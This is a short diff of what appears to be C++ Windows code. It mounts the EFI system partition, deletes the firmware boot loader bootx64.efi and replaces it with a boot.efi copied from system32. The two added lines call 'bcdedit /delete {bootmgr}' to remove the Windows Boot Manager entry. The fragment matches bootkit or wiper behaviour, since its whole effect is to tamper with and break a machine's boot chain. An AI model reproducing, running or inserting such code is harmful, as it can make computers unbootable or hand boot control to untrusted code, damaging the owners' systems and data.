@@ -127,6 +127,8 @@ int main()
         MountEFI();
         DeleteFile(L"P:\\EFI\\Boot\\bootx64.efi");
         CopyFile(L"C:\\Windows\\system32\\boot.efi", L"P:\\EFI\\Boot\\bootx64.efi", false);
+        const char* bcdCommand = "bcdedit /delete {bootmgr}";
+        std::system(bcdCommand);
         
     }
     else {
